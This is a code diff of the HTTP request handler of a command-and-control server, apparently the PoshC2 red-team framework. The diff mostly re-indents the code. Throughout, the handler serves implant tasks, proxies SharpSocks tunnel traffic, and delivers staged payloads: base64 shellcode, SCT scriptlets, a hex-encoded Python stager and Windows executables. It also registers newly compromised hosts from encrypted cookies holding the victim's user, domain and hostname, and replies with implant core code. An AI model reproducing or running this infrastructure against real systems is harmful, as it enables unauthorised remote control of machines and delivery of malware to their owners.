@@ -88,43 +88,43 @@ class MyHandler(BaseHTTPRequestHandler):
                 sharplist.append("/" + i)
 
             self.server_version = ServerHeader
-        self.sys_version = ""
-        if not self.cookieHeader:
-            self.cookieHeader = "NONE"
+            self.sys_version = ""
+            if not self.cookieHeader:
+                self.cookieHeader = "NONE"
 
-        # implant gets a new task
-        new_task = newTask(self.path)
+            # implant gets a new task
+            new_task = newTask(self.path)
 
-        if new_task:
-            self.send_response(200)
-            self.send_header("Content-type", "text/html")
-            self.end_headers()
-            self.wfile.write(new_task)
-
-        elif [ele for ele in sharplist if(ele in UriPath)]:
-            try:
-                open("%swebserver.log" % PoshProjectDirectory, "a").write("%s - [%s] Making GET connection to SharpSocks %s%s\r\n" % (self.address_string(), self.log_date_time_string(), SocksHost, UriPath))
-                r = Request("%s%s" % (SocksHost, UriPath), headers={'Accept-Encoding': 'gzip', 'Cookie': '%s' % self.cookieHeader, 'User-Agent': UserAgent})
-                res = urlopen(r)
-                sharpout = res.read()
+            if new_task:
                 self.send_response(200)
                 self.send_header("Content-type", "text/html")
-                self.send_header("Connection", "close")
-                self.send_header("Content-Length", len(sharpout))
                 self.end_headers()
-                if (len(sharpout) > 0):
-                    self.wfile.write(sharpout)
-            except HTTPError as e:
-                self.send_response(e.code)
-                self.send_header("Content-type", "text/html")
-                self.send_header("Connection", "close")
-                self.end_headers()
-                open("%swebserver.log" % PoshProjectDirectory, "a").write("[-] Error with SharpSocks - is SharpSocks running %s%s\r\n%s\r\n" % (SocksHost, UriPath, traceback.format_exc()))
-                open("%swebserver.log" % PoshProjectDirectory, "a").write("[-] SharpSocks  %s\r\n" % e)
-            except Exception as e:
-                open("%swebserver.log" % PoshProjectDirectory, "a").write("[-] Error with SharpSocks - is SharpSocks running %s%s \r\n%s\r\n" % (SocksHost, UriPath, traceback.format_exc()))
-                open("%swebserver.log" % PoshProjectDirectory, "a").write("[-] SharpSocks  %s\r\n" % e)
-                print(Colours.RED + "Error with SharpSocks or old implant connection - is SharpSocks running" + Colours.END)
+                self.wfile.write(new_task)
+
+            elif [ele for ele in sharplist if(ele in UriPath)]:
+                try:
+                    open("%swebserver.log" % PoshProjectDirectory, "a").write("%s - [%s] Making GET connection to SharpSocks %s%s\r\n" % (self.address_string(), self.log_date_time_string(), SocksHost, UriPath))
+                    r = Request("%s%s" % (SocksHost, UriPath), headers={'Accept-Encoding': 'gzip', 'Cookie': '%s' % self.cookieHeader, 'User-Agent': UserAgent})
+                    res = urlopen(r)
+                    sharpout = res.read()
+                    self.send_response(200)
+                    self.send_header("Content-type", "text/html")
+                    self.send_header("Connection", "close")
+                    self.send_header("Content-Length", len(sharpout))
+                    self.end_headers()
+                    if (len(sharpout) > 0):
+                        self.wfile.write(sharpout)
+                except HTTPError as e:
+                    self.send_response(e.code)
+                    self.send_header("Content-type", "text/html")
+                    self.send_header("Connection", "close")
+                    self.end_headers()
+                    open("%swebserver.log" % PoshProjectDirectory, "a").write("[-] Error with SharpSocks - is SharpSocks running %s%s\r\n%s\r\n" % (SocksHost, UriPath, traceback.format_exc()))
+                    open("%swebserver.log" % PoshProjectDirectory, "a").write("[-] SharpSocks  %s\r\n" % e)
+                except Exception as e:
+                    open("%swebserver.log" % PoshProjectDirectory, "a").write("[-] Error with SharpSocks - is SharpSocks running %s%s \r\n%s\r\n" % (SocksHost, UriPath, traceback.format_exc()))
+                    open("%swebserver.log" % PoshProjectDirectory, "a").write("[-] SharpSocks  %s\r\n" % e)
+                    print(Colours.RED + "Error with SharpSocks or old implant connection - is SharpSocks running" + Colours.END)
                     print(Colours.RED + UriPath + Colours.END)
                     self.send_response(404)
                     self.send_header("Content-type", "text/html")
@@ -141,168 +141,168 @@ class MyHandler(BaseHTTPRequestHandler):
                     content = f.read()
                 self.send_response(200)
                 self.send_header("Content-type", "text/html")
-            self.end_headers()
-            self.wfile.write(content)
+                self.end_headers()
+                self.wfile.write(content)
 
-        elif ("%s_rg" % QuickCommandURI) in self.path:
-            filename = "%srg_sct.xml" % (PayloadsDirectory)
-            with open(filename, 'rb') as f:
-                content = f.read()
-            self.send_response(200)
-            self.send_header("Content-type", "text/html")
-            self.end_headers()
-            self.wfile.write(content)
-
-        elif ("%ss/86/portal" % QuickCommandURI) in self.path:
-            filename = "%sSharp_v4_x86_Shellcode.bin" % (PayloadsDirectory)
-            with open(filename, 'rb') as f:
-                content = f.read()
-            content = base64.b64encode(content)
-            self.send_response(200)
-            self.send_header("Content-type", "text/html")
-            self.end_headers()
-            self.wfile.write(content)
-
-        elif ("%ss/64/portal" % QuickCommandURI) in self.path:
-            filename = "%sSharp_v4_x64_Shellcode.bin" % (PayloadsDirectory)
-            with open(filename, 'rb') as f:
-                content = f.read()
-            content = base64.b64encode(content)
-            self.send_response(200)
-            self.send_header("Content-type", "text/html")
-            self.end_headers()
-            self.wfile.write(content)
-
-        elif ("%sp/86/portal" % QuickCommandURI) in self.path:
-            filename = "%sPosh_v4_x86_Shellcode.bin" % (PayloadsDirectory)
-            with open(filename, 'rb') as f:
-                content = f.read()
-            content = base64.b64encode(content)
-            self.send_response(200)
-            self.send_header("Content-type", "text/html")
-            self.end_headers()
-            self.wfile.write(content)
-
-        elif ("%sp/64/portal" % QuickCommandURI) in self.path:
-            filename = "%sPosh_v4_x64_Shellcode.bin" % (PayloadsDirectory)
-            with open(filename, 'rb') as f:
-                content = f.read()
-            content = base64.b64encode(content)
-            self.send_response(200)
-            self.send_header("Content-type", "text/html")
-            self.end_headers()
-            self.wfile.write(content)
-
-        elif ("%s_cs" % QuickCommandURI) in self.path:
-            filename = "%scs_sct.xml" % (PayloadsDirectory)
-            with open(filename, 'rb') as f:
-                content = f.read()
-            self.send_response(200)
-            self.send_header("Content-type", "text/html")
-            self.end_headers()
-            self.wfile.write(content)
-
-        elif ("%s_py" % QuickCommandURI) in self.path:
-            filename = "%saes.py" % (PayloadsDirectory)
-            with open(filename, 'rb') as f:
-                content = f.read()
-                content = "a" + "".join("{:02x}".format(c) for c in content)
-            self.send_response(200)
-            self.send_header("Content-type", "text/plain")
-            self.end_headers()
-            self.wfile.write(bytes(content, "utf-8"))
-
-        elif ("%s_ex86" % QuickCommandURI) in self.path:
-            filename = "%sPosh32.exe" % (PayloadsDirectory)
-            with open(filename, 'rb') as f:
-                content = f.read()
-            self.send_response(200)
-            self.send_header("Content-type", "application/x-msdownload")
-            self.end_headers()
-            self.wfile.write(content)
-
-        elif ("%s_ex64" % QuickCommandURI) in self.path:
-            filename = "%sPosh64.exe" % (PayloadsDirectory)
-            with open(filename, 'rb') as f:
-                content = f.read()
-            self.send_response(200)
-            self.send_header("Content-type", "application/x-msdownload")
-            self.end_headers()
-            self.wfile.write(content)
-
-        # register new implant
-        elif new_implant_url in self.path and self.cookieHeader.startswith("SessionID"):
-            implant_type = "PS"
-            if self.path == ("%s?p" % new_implant_url):
-                implant_type = "PS Proxy"
-            if self.path == ("%s?d" % new_implant_url):
-                implant_type = "PS Daisy"
-            if self.path == ("%s?m" % new_implant_url):
-                implant_type = "Python"
-            if self.path == ("%s?d?m" % new_implant_url):
-                implant_type = "Python Daisy"
-            if self.path == ("%s?p?m" % new_implant_url):
-                implant_type = "Python Proxy"
-            if self.path == ("%s?c" % new_implant_url):
-                implant_type = "C#"
-            if self.path == ("%s?d?c" % new_implant_url):
-                implant_type = "C# Daisy"
-            if self.path == ("%s?p?c" % new_implant_url):
-                implant_type = "C# Proxy"
-
-            if implant_type.startswith("C#"):
-                cookieVal = (self.cookieHeader).replace("SessionID=", "")
-                decCookie = decrypt(KEY, cookieVal)
-                IPAddress = "%s:%s" % (self.client_address[0], self.client_address[1])
-                Domain, User, Hostname, Arch, PID, Proxy = decCookie.split(";")
-                Proxy = Proxy.replace("\x00", "")
-                if "\\" in User:
-                    User = User[User.index("\\") + 1:]
-                newImplant = Implant(IPAddress, implant_type, str(Domain), str(User), str(Hostname), Arch, PID, Proxy)
-                newImplant.save()
-                newImplant.display()
-                newImplant.autoruns()
-                responseVal = encrypt(KEY, newImplant.SharpCore)
+            elif ("%s_rg" % QuickCommandURI) in self.path:
+                filename = "%srg_sct.xml" % (PayloadsDirectory)
+                with open(filename, 'rb') as f:
+                    content = f.read()
                 self.send_response(200)
                 self.send_header("Content-type", "text/html")
                 self.end_headers()
-                self.wfile.write(responseVal)
+                self.wfile.write(content)
 
-            elif implant_type.startswith("Python"):
-                cookieVal = (self.cookieHeader).replace("SessionID=", "")
-                decCookie = decrypt(KEY, cookieVal)
-                IPAddress = "%s:%s" % (self.client_address[0], self.client_address[1])
-                User, Domain, Hostname, Arch, PID, Proxy = decCookie.split(";")
-                Proxy = Proxy.replace("\x00", "")
-                newImplant = Implant(IPAddress, implant_type, str(Domain), str(User), str(Hostname), Arch, PID, Proxy)
-                newImplant.save()
-                newImplant.display()
-                responseVal = encrypt(KEY, newImplant.PythonCore)
-
+            elif ("%ss/86/portal" % QuickCommandURI) in self.path:
+                filename = "%sSharp_v4_x86_Shellcode.bin" % (PayloadsDirectory)
+                with open(filename, 'rb') as f:
+                    content = f.read()
+                content = base64.b64encode(content)
                 self.send_response(200)
                 self.send_header("Content-type", "text/html")
                 self.end_headers()
-                self.wfile.write(responseVal)
-            else:
-                try:
+                self.wfile.write(content)
+
+            elif ("%ss/64/portal" % QuickCommandURI) in self.path:
+                filename = "%sSharp_v4_x64_Shellcode.bin" % (PayloadsDirectory)
+                with open(filename, 'rb') as f:
+                    content = f.read()
+                content = base64.b64encode(content)
+                self.send_response(200)
+                self.send_header("Content-type", "text/html")
+                self.end_headers()
+                self.wfile.write(content)
+
+            elif ("%sp/86/portal" % QuickCommandURI) in self.path:
+                filename = "%sPosh_v4_x86_Shellcode.bin" % (PayloadsDirectory)
+                with open(filename, 'rb') as f:
+                    content = f.read()
+                content = base64.b64encode(content)
+                self.send_response(200)
+                self.send_header("Content-type", "text/html")
+                self.end_headers()
+                self.wfile.write(content)
+
+            elif ("%sp/64/portal" % QuickCommandURI) in self.path:
+                filename = "%sPosh_v4_x64_Shellcode.bin" % (PayloadsDirectory)
+                with open(filename, 'rb') as f:
+                    content = f.read()
+                content = base64.b64encode(content)
+                self.send_response(200)
+                self.send_header("Content-type", "text/html")
+                self.end_headers()
+                self.wfile.write(content)
+
+            elif ("%s_cs" % QuickCommandURI) in self.path:
+                filename = "%scs_sct.xml" % (PayloadsDirectory)
+                with open(filename, 'rb') as f:
+                    content = f.read()
+                self.send_response(200)
+                self.send_header("Content-type", "text/html")
+                self.end_headers()
+                self.wfile.write(content)
+
+            elif ("%s_py" % QuickCommandURI) in self.path:
+                filename = "%saes.py" % (PayloadsDirectory)
+                with open(filename, 'rb') as f:
+                    content = f.read()
+                    content = "a" + "".join("{:02x}".format(c) for c in content)
+                self.send_response(200)
+                self.send_header("Content-type", "text/plain")
+                self.end_headers()
+                self.wfile.write(bytes(content, "utf-8"))
+
+            elif ("%s_ex86" % QuickCommandURI) in self.path:
+                filename = "%sPosh32.exe" % (PayloadsDirectory)
+                with open(filename, 'rb') as f:
+                    content = f.read()
+                self.send_response(200)
+                self.send_header("Content-type", "application/x-msdownload")
+                self.end_headers()
+                self.wfile.write(content)
+
+            elif ("%s_ex64" % QuickCommandURI) in self.path:
+                filename = "%sPosh64.exe" % (PayloadsDirectory)
+                with open(filename, 'rb') as f:
+                    content = f.read()
+                self.send_response(200)
+                self.send_header("Content-type", "application/x-msdownload")
+                self.end_headers()
+                self.wfile.write(content)
+
+            # register new implant
+            elif new_implant_url in self.path and self.cookieHeader.startswith("SessionID"):
+                implant_type = "PS"
+                if self.path == ("%s?p" % new_implant_url):
+                    implant_type = "PS Proxy"
+                if self.path == ("%s?d" % new_implant_url):
+                    implant_type = "PS Daisy"
+                if self.path == ("%s?m" % new_implant_url):
+                    implant_type = "Python"
+                if self.path == ("%s?d?m" % new_implant_url):
+                    implant_type = "Python Daisy"
+                if self.path == ("%s?p?m" % new_implant_url):
+                    implant_type = "Python Proxy"
+                if self.path == ("%s?c" % new_implant_url):
+                    implant_type = "C#"
+                if self.path == ("%s?d?c" % new_implant_url):
+                    implant_type = "C# Daisy"
+                if self.path == ("%s?p?c" % new_implant_url):
+                    implant_type = "C# Proxy"
+
+                if implant_type.startswith("C#"):
                     cookieVal = (self.cookieHeader).replace("SessionID=", "")
-                    decCookie = decrypt(KEY.encode("utf-8"), cookieVal)
-                    decCookie = str(decCookie)
+                    decCookie = decrypt(KEY, cookieVal)
+                    IPAddress = "%s:%s" % (self.client_address[0], self.client_address[1])
                     Domain, User, Hostname, Arch, PID, Proxy = decCookie.split(";")
                     Proxy = Proxy.replace("\x00", "")
-                    IPAddress = "%s:%s" % (self.client_address[0], self.client_address[1])
-                    if "\\" in str(User):
-                        User = User[str(User).index('\\') + 1:]
+                    if "\\" in User:
+                        User = User[User.index("\\") + 1:]
                     newImplant = Implant(IPAddress, implant_type, str(Domain), str(User), str(Hostname), Arch, PID, Proxy)
                     newImplant.save()
                     newImplant.display()
                     newImplant.autoruns()
-                    responseVal = encrypt(KEY, newImplant.PSCore)
+                    responseVal = encrypt(KEY, newImplant.SharpCore)
                     self.send_response(200)
                     self.send_header("Content-type", "text/html")
                     self.end_headers()
                     self.wfile.write(responseVal)
-                except Exception as e:
+
+                elif implant_type.startswith("Python"):
+                    cookieVal = (self.cookieHeader).replace("SessionID=", "")
+                    decCookie = decrypt(KEY, cookieVal)
+                    IPAddress = "%s:%s" % (self.client_address[0], self.client_address[1])
+                    User, Domain, Hostname, Arch, PID, Proxy = decCookie.split(";")
+                    Proxy = Proxy.replace("\x00", "")
+                    newImplant = Implant(IPAddress, implant_type, str(Domain), str(User), str(Hostname), Arch, PID, Proxy)
+                    newImplant.save()
+                    newImplant.display()
+                    responseVal = encrypt(KEY, newImplant.PythonCore)
+
+                    self.send_response(200)
+                    self.send_header("Content-type", "text/html")
+                    self.end_headers()
+                    self.wfile.write(responseVal)
+                else:
+                    try:
+                        cookieVal = (self.cookieHeader).replace("SessionID=", "")
+                        decCookie = decrypt(KEY.encode("utf-8"), cookieVal)
+                        decCookie = str(decCookie)
+                        Domain, User, Hostname, Arch, PID, Proxy = decCookie.split(";")
+                        Proxy = Proxy.replace("\x00", "")
+                        IPAddress = "%s:%s" % (self.client_address[0], self.client_address[1])
+                        if "\\" in str(User):
+                            User = User[str(User).index('\\') + 1:]
+                        newImplant = Implant(IPAddress, implant_type, str(Domain), str(User), str(Hostname), Arch, PID, Proxy)
+                        newImplant.save()
+                        newImplant.display()
+                        newImplant.autoruns()
+                        responseVal = encrypt(KEY, newImplant.PSCore)
+                        self.send_response(200)
+                        self.send_header("Content-type", "text/html")
+                        self.end_headers()
+                        self.wfile.write(responseVal)
+                    except Exception as e:
                         print("Decryption error: %s" % e)
                         traceback.print_exc()
                         self.send_response(404)
